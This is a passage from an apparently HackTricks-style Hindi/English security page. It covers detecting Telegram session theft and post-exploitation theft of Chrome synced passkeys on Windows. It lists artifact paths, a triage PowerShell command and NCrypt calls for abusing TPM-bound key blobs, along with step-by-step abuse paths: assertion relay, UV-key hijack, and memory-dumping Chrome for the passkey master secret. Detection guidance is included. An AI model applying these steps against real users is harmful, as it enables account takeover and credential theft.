किसी non-Telegram process द्वारा `tdata` तक recursive access को `SeBackupPrivilege` enablement, backup-semantics file opens, VSS activity, या `/B` का उपयोग करने वाले child `robocopy.exe` के साथ correlate करें। `%APPDATA%` और `%LOCALAPPDATA%\Packages`—दोनों की तेज़ी से enumeration के बाद उसी process से होने वाले outbound connections की भी जाँच करें। Compromise के बाद, अपरिचित sessions समाप्त करने के लिए **Settings → Devices** (या **Privacy & Security → Active Sessions**) का उपयोग करें; केवल two-step verification enable करने से पहले से चुराई गई authorization रद्द नहीं होती।<sup>[[10]](#references)[[13]](#references)</sup>

## Windows पर Chrome से Passkeys / WebAuthn credential theft

यदि **Chrome + Google Password Manager synced passkeys** का उपयोग करने वाले Windows host पर **victim user** के रूप में code execution प्राप्त हो जाता है, तो passkeys एक दिलचस्प post-exploitation target बन जाते हैं—यहाँ तक कि **admin/SYSTEM के बिना भी**।<sup>[[4]](#references)</sup>

### दिलचस्प local artifacts

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** में protobuf-encoded **`WebauthnCredentialSpecifics`** रिकॉर्ड्स संग्रहीत होते हैं। उसी user की process synced passkeys के **RP ID**, **username**, **credential ID**, और encrypted private-key material की सूची बना सकती है।<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** में local device-enrollment state संग्रहीत होती है, जैसे **`wrapped_identity_private_key`** और synced credentials को recover करने के लिए उपयोग किया जाने वाला wrapped secret।<sup>[[4]](#references)</sup>

त्वरित triage:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobs का स्थानीय signing oracle के रूप में अब भी दुरुपयोग किया जा सकता है

अगर browser किसी TPM-backed identity key को **`NCRYPT_OPAQUE_KEY_BLOB`** के रूप में export करता है और उस blob को user-accessible state में store करता है, तो malware को raw private key निकालने की ज़रूरत **नहीं** है। वह उसी **machine** पर blob को फिर से import करके स्थानीय TPM से attacker-controlled data पर sign करने के लिए कह सकता है:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

इसका मतलब है कि **hardware binding डिवाइस से बाहर export होने से रोकता है, लेकिन compromised endpoint पर उसी user द्वारा इस्तेमाल होने से नहीं**।

### दुरुपयोग के व्यावहारिक तरीके

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome के LevelDB से `WebauthnCredentialSpecifics` enumerate करें।
   - Passkey login शुरू करें और एक नया WebAuthn challenge प्राप्त करें।
   - Cloud-authenticator request binding पर sign करने के लिए, पीड़ित के TPM पर चुराए गए `wrapped_identity_private_key` blob का इस्तेमाल करें।
   - लौटाए गए assertion को relying party तक relay करें।
   - यह खास तौर पर तब उपयोगी है, जब RP `userVerification=preferred` स्वीकार करता हो या **`UV=0`** वाले assertions को अस्वीकार न करता हो।
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` हटाकर या मान्य signed `device/forget` operation भेजकर दोबारा onboarding करवाएँ।
   - अगर onboarding के बाद डिवाइस **`uv_key_pending`** स्थिति में रहता है, तो attacker-नियंत्रित UV public key register करें।
   - अगर provider नई UV key के attestation / secure-hardware origin को verify नहीं करता, तो बाद में attacker key से किए गए signatures को **`UV=1`** माना जाएगा।
3. **Master-secret / SDS recovery की चोरी**<sup>[[4]](#references)</sup>
   - Recovery या rejoin करवाएँ, ताकि Chrome synced-passkey master secret fetch करे।
   - `passkey_enclave_state` के दोबारा बनने या उसमें बदलाव होने पर नज़र रखें, फिर Chrome memory dump करें, जब plaintext **security domain secret (SDS)** memory में मौजूद हो।
   - बरामद SDS का इस्तेमाल हर `WebauthnCredentialSpecifics` record के encrypted fields को decrypt करने और portable WebAuthn private keys निकालने के लिए करें।

### DFIR / detection के विचार

- `passkey_enclave_state` के **हटाए जाने/दोबारा बनने** पर नज़र रखें।<sup>[[4]](#references)</sup>
- गैर-ब्राउज़र प्रक्रियाओं द्वारा Chrome **`Sync Data\LevelDB`** तक असामान्य पहुंच पर alert करें।
- **Chrome memory dumps** या संदिग्ध cross-process memory access पर alert करें।
- बार-बार आने वाले **Google Password Manager recovery PIN** prompts या अनपेक्षित re-onboarding की जाँच करें।
- ध्यान रखें कि synced passkeys के लिए WebAuthn **`signCount`** अक्सर उपयोगी नहीं होता, क्योंकि यह स्थिर रह सकता है; इसलिए सामान्य clone detection कमज़ोर होती है।

## References

- [1] [Unit 42 – उच्च-मूल्य वाले क्षेत्रों को निशाना बनाने वाले, वर्षों तक पता न चले ऑपरेशनों की जाँच](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक पहुंचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon के अंदर: Relay Network और एक गुप्त offensive operation की कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Passwordless Authentication में एक नया Attack Surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows Hacking: Microsoft Systems और Networks पर हमले](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store वास्तव में कैसे काम करता है: NTDS.dit के अंदर (भाग 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho ने Still Toolkit के साथ अपना Cyber-Espionage Arsenal बढ़ाया](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW function और `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – सक्रिय sessions समाप्त करना](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard और Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Credentials की सुरक्षा और प्रबंधन](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - समर्थित inputs और quick start](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
